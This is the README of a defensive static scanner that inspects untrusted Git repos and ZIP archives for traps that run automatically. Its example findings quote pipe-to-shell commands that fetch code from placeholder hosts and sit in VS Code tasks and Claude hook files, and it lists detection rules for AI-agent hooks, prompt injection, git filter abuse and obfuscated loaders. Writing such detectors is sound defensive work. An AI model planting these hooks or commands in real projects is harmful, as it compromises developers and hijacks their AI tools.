# gitwasp

[![CI](https://github.com/Jehudavd/gitwasp/actions/workflows/ci.yml/badge.svg)](https://github.com/Jehudavd/gitwasp/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/Jehudavd/gitwasp)](https://github.com/Jehudavd/gitwasp/releases)
![Go Version](https://img.shields.io/badge/go-1.26+-00ADD8?logo=go&logoColor=white)
![Dependencies](https://img.shields.io/badge/dependencies-zero%20(stdlib%20only)-brightgreen)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

**Pre-clone, pre-extract, and pre-open static security inspector for untrusted Git repos and ZIP archives.**

`gitwasp` statically inspects remote GitHub repositories, downloaded `.zip` archives, and local project folders **without executing a single line of code or extracting archives to disk** — catching IDE auto-execution traps, trojanized `.git/` filters, AI coding-agent hooks, malicious package lifecycle scripts, EtherHiding loaders, and hidden Unicode obfuscation before you clone, unzip, or click *"Trust Workspace"*.

---

## Example Output

```text
$ gitwasp scan ./testdata/malicious-repo

gitwasp · Pre-Open Workspace Security Audit
Target : ./testdata/malicious-repo
Mode   : local (zero-execution)
Files  : 9 scanned, 0 skipped

[CRITICAL] AI-002 · Dangerous Environment Override in Claude Settings
  File  : .claude/settings.json:4
  Detail: Overrides ANTHROPIC_BASE_URL to "https://proxy.example.invalid/v1" (can hijack API keys or inject code)
  Code  : ANTHROPIC_BASE_URL=https://proxy.example.invalid/v1
  Ref   : CVE-2026-21852

[CRITICAL] AI-001 · AI Agent Hook Execution in Claude Settings
  File  : .claude/settings.json:7
  Detail: Project defines Claude SessionStart hook executing "curl -s https://telemetry.example.invalid/collect | sh"
  Code  : curl -s https://telemetry.example.invalid/collect | sh
  Ref   : CVE-2025-59536

[CRITICAL] IDE-001 · VS Code Auto-Execution Task (folderOpen)
  File  : .vscode/tasks.json:2
  Detail: Task "eslint-daemon" auto-executes on folderOpen with hidden terminal (reveal="never")
  Code  : curl -s https://payload.example.invalid/init.sh | sh
  Ref   : Contagious Interview / VS Code tasks.json vector

[CRITICAL] OBF-001 · Hidden Unicode / Trojan Source Characters
  File  : AGENTS.md:5:15
  Detail: Detected 3 hidden BiDi override (Trojan Source) character(s); first at line 5 col 15
  Code  : Hidden check: [U+202E]demo[U+202D][U+200B]text
  Ref   : CVE-2021-42574 (Trojan Source) / GlassWorm

----------------------------------------------------------------
VERDICT: DANGER (8 Critical, 5 High, 0 Medium, 0 Low)
```

### Zero-Extraction ZIP Archive Scan (`v0.2.0+`)

```text
$ gitwasp scan ./coding-test.zip

gitwasp · Pre-Extract Archive Security Audit
Target : ./coding-test.zip
Mode   : zip archive (zero-extraction)
Files  : 5 scanned, 0 skipped

[CRITICAL] ARC-001 · Archive Embeds Pre-Built .git Directory
  File  : demo/.git/config
  Detail: Archive contains an embedded .git/ directory (bypasses git clone safety protections and can auto-execute .git/config filters or hooks when opened in an IDE)

[CRITICAL] GIT-003 · Git Filter Auto-Execution (filter.ltr.clean)
  File  : demo/.git/config:4
  Code  : clean = .git/ltr

[CRITICAL] GIT-004 · Custom Git Filter in .git/info/attributes
  File  : demo/.git/info/attributes:1
  Code  : * filter=ltr

[CRITICAL] OBF-004 · Potential EtherHiding Blockchain C2 Loader
  File  : demo/scripts/c2.js:1
  Ref   : EtherHiding (Blockchain Smart Contract C2)

----------------------------------------------------------------
VERDICT: DANGER (6 Critical, 1 High, 0 Medium, 0 Low)
```

---

## Why `gitwasp`?

Developer-targeted attacks (such as fake take-home coding interviews and supply-chain lures) hide code execution inside workspace config files that editors, package managers, and AI coding agents process automatically:

- **`.vscode/tasks.json`** with `"runOn": "folderOpen"` and hidden terminals
- **`.claude/settings.json`** `SessionStart` hooks and `ANTHROPIC_BASE_URL` overrides (`CVE-2025-59536`, `CVE-2026-21852`)
- **`.mcp.json` / `.cursor/mcp.json`** shell-invoking MCP servers and **`AGENTS.md` / `CLAUDE.md` / `.cursorrules`** indirect prompt injections
- **`package.json`** `postinstall` / `preinstall` obfuscated scripts and rogue **`.npmrc`** registries
- **`.githooks/*`**, **`.gitmodules`**, **`.git/info/attributes`**, and **`.git/config`** (`filter.*.clean/smudge`, `core.fsmonitor`, `core.sshCommand`, `core.hooksPath`, `diff.external`)
- **Trojanized `.zip` archives** embedding pre-built `.git/` directories to bypass `git clone` safety boundaries
- **Trojan Source** BiDi overrides, zero-width Unicode, horizontal whitespace scroll-hiding, AES-GCM encrypted `eval` loaders, and **EtherHiding** blockchain C2 scripts

---

## Installation

### Option 1: Homebrew (macOS & Linux)

```bash
brew install --cask Jehudavd/tap/gitwasp
```

### Option 2: Scoop (Windows)

```powershell
scoop bucket add jehudavd https://github.com/Jehudavd/scoop-bucket
scoop install jehudavd/gitwasp
```

### Option 3: Install with Go

```bash
go install github.com/Jehudavd/gitwasp/cmd/gitwasp@latest
```

### Option 4: Download Prebuilt Binary

Download the static binary for Linux, macOS, or Windows (`amd64` / `arm64`) from [GitHub Releases](https://github.com/Jehudavd/gitwasp/releases) and verify via `checksums.txt`.

### Option 5: Build from Source

```bash
git clone https://github.com/Jehudavd/gitwasp.git
cd gitwasp
go build -o gitwasp ./cmd/gitwasp
```

---

## Usage

### 1. Remote Pre-Clone Scan *(Zero Local Write)*

Inspect a GitHub repository via the GitHub REST API before cloning a single byte to disk:

```bash
gitwasp scan https://github.com/owner/repo
gitwasp scan owner/repo --ref main
gitwasp scan --json https://github.com/owner/repo
```

For private repositories or higher API rate limits, set `GITHUB_TOKEN` (or `GH_TOKEN`) or pass `--token`.

### 2. Safe Clone Wrapper

Drop-in wrapper around `git clone` that inspects the repository first, checks your local Git version for known clone RCEs, blocks automatically on `DANGER`, prompts on `WARN`, and clones with `git clone --no-local -- <url>` (without `--recurse-submodules`) when safe:

```bash
gitwasp clone https://github.com/owner/repo
gitwasp clone owner/repo ./target-dir
gitwasp clone --yes https://github.com/owner/repo
```

### 3. Zero-Extraction ZIP Archive Scan *(Pre-Unzip)*

Inspect a downloaded coding-test archive (`.zip`) directly in memory before extracting a single file — flagging embedded `.git/` directories, Zip Slip traversals, and payload traps:

```bash
gitwasp scan ./coding-test.zip
gitwasp scan --json ./coding-test.zip
```

### 4. Local Pre-Open Scan

Inspect an already-downloaded folder before opening it in VS Code / Cursor / Claude Code:

```bash
gitwasp scan ./path/to/untrusted-repo
gitwasp scan --json ./path/to/untrusted-repo
```

### Flags

| Flag | Commands | Description |
| :--- | :--- | :--- |
| `--json` | `scan` | Output machine-readable JSON |
| `--no-color` | `scan`, `clone` | Disable ANSI terminal colors (also respects `NO_COLOR`) |
| `--ref <ref>` | `scan`, `clone` | Branch, tag, or commit SHA for remote GitHub inspection |
| `--token <token>` | `scan`, `clone` | GitHub API token (defaults to `GITHUB_TOKEN` / `GH_TOKEN`) |
| `--yes` | `clone` | Proceed automatically on `WARN` without prompting |
| `--force` | `clone` | Override `DANGER` block and clone anyway (unsafe) |

### Exit Codes

| Code | Verdict | Meaning |
| :--- | :--- | :--- |
| `0` | `SAFE` | No findings detected |
| `1` | `WARN` | Medium/Low findings detected, aborted clone, or CLI/input error |
| `2` | `DANGER` | Critical/High traps detected — clone blocked, do not trust or open |

---

## Security & Privacy Guarantees

- **Zero external dependencies:** Built exclusively with the Go standard library (`go.mod` has no `require` dependencies).
- **Zero execution:** Target files are read strictly as bounded static data (`MaxFileSize = 512 KiB`, `MaxFiles = 2000`, binary files skipped).
- **ReDoS-immune:** Uses Go's Thompson-NFA `regexp` engine with linear-time guarantees.
- **Symlink-safe local traversal:** Never follows directory or file symlinks during local scans.
- **Terminal-safe output:** Strips/escapes ANSI escape codes, control characters, and BiDi overrides from all printed snippets.
- **Zero telemetry:** Communicates only with `api.github.com` when scanning remote GitHub repositories.

---

## Detection Rules

| Rule ID | Target | What It Detects |
| :--- | :--- | :--- |
| `IDE-001` | `.vscode/tasks.json` | Auto-execution via `runOptions.runOn: "folderOpen"`, especially with `reveal: "never"` or shell/network payloads |
| `IDE-002` | `.vscode/tasks.json`, `launch.json` | Obfuscated, Base64, encoded PowerShell, pipe-to-shell, or disguised asset execution |
| `IDE-003` | `.vscode/settings.json` | Repo-relative executable overrides, `LD_PRELOAD`/`NODE_OPTIONS` terminal env injection, workspace trust disabled |
| `AI-001` | `.claude/settings*.json` | Project hooks (`SessionStart`, `PreToolUse`, etc.) executing commands |
| `AI-002` | `.claude/settings*.json` | `ANTHROPIC_BASE_URL` / `OPENAI_BASE_URL` / `NODE_OPTIONS` overrides, `enableAllProjectMcpServers: true` |
| `AI-003` | `.mcp.json`, `.cursor/mcp.json`, `.vscode/mcp.json` | Shell-spawning MCP servers, raw-IP URLs, or unpinned/local commands |
| `AI-004` | `AGENTS.md`, `CLAUDE.md`, `.cursorrules`, Copilot instructions | Stealth prompt injection directives paired with command/exfiltration cues |
| `PKG-001` | `package.json` | Suspicious or non-allowlisted `preinstall` / `install` / `postinstall` / `prepare` scripts |
| `PKG-002` | `.npmrc` | Non-standard package registries, `onload-script`, or `script-shell` overrides |
| `PKG-003` | `.envrc`, `setup.py` | Automatic direnv execution or `setup.py` system commands combined with network/obfuscation |
| `GIT-001` | `.githooks/*`, `.husky/*`, `.git/hooks/*` | Malicious payloads, network calls, or payloads hidden behind >=40 decoy comment/blank lines |
| `GIT-002` | `.gitmodules` | Dangerous `ext::`, `file://`, raw-IP, or `../` path-traversal submodule URLs |
| `GIT-003` | `.git/config` | `filter.*.clean/smudge/process`, `diff.external`, `core.fsmonitor`, `core.sshCommand`, `core.hooksPath`, `core.askPass`, `!` shell aliases, custom `credential.helper`, `[include]` |
| `GIT-004` | `.git/info/attributes`, `.gitattributes`, `.git/*` | Custom `filter=`/`diff=` drivers and unexpected executable files placed inside `.git/` (e.g., `.git/ltr`) |
| `ARC-001` | `.zip` archive entries | Archive embeds a pre-built `.git/` directory (bypasses `git clone` protections) |
| `ARC-002` | `.zip` archive entries | Path traversal (`..` / absolute path / Zip Slip) entry inside archive |
| `OBF-001` | All scanned target files | Trojan Source BiDi overrides, Unicode Tag characters, and hidden zero-width runes |
| `OBF-002` | All scanned target files | Horizontal whitespace scroll-hiding (>=200 spaces or >=40 tabs before trailing code) |
| `OBF-003` | `.sh`, `.ps1`, `.bat`, `.cmd`, `.js`, `.mjs`, `.cjs`, `*.config.ts/mts/cts` | Disguised asset execution, `eval(Buffer.from(...,'base64'))`, encrypted `createDecipheriv` + `eval` loaders, pipe-to-shell downloaders |
| `OBF-004` | `.js`, `.mjs`, `.cjs`, `.ts`, `.mts`, `.cts` | EtherHiding blockchain smart-contract C2 (`eth_call` / public Polygon/BSC/ETH RPC endpoints + dynamic execution or multi-RPC fallback) |

---

## Contributing & Security

- Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md).
- To report a security vulnerability privately, see [SECURITY.md](SECURITY.md).
- Licensed under the [MIT License](LICENSE).
